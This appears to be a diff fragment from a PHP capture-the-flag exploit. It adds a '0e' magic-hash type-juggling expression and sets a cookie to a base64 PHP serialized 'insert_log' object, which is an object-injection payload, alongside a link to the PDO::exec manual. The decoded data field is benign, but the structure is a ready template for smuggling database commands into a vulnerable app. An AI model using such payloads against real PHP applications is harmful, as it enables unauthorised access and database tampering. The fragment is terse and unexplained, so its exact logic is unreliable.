@@ -1,0 +1,4 @@
+explode(".","0.0e")[1].rand(0, 247247247) == "0"
+$_COOKIE["247"] = "TzoxMDoiaW5zZXJ0X2xvZyI6MTp7czo4OiJuZXdfZGF0YSI7czoyMDoiVmFsaWQgYWNjZXNzIGxvZ2dlZCEiO30=.0e";
+
+https://www.php.net/manual/en/pdo.exec.php
